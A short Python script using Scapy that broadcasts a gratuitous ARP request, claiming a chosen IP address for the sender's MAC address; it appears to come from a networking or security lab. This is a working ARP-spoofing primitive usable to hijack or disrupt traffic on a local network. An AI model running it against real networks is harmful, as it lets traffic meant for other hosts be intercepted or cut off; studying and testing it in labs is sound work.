#!/usr/bin/env python3

import sys
from scapy.all import *

def main():
    # Ensure correct usage
    if len(sys.argv) != 2:
        usage()
        sys.exit(2)
        
    # unpack values
    psrc_ = sys.argv[1]
    pdst_ = sys.argv[1]
    
    # construct packet
    E = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    A = ARP(psrc = psrc_, pdst = pdst_, op = 1, hwdst = 'ff:ff:ff:ff:ff:ff')
    sendp(E/A, verbose=0)
    print(f'sent gratituos ARP request')
    
def usage():
    print("Usage: ./arp-gratuitous.py <src-ip>\
    \n\tsrc-ip: IP address of the host you want to map to your MAC address\n")
    
    
if __name__ == '__main__':
    main()
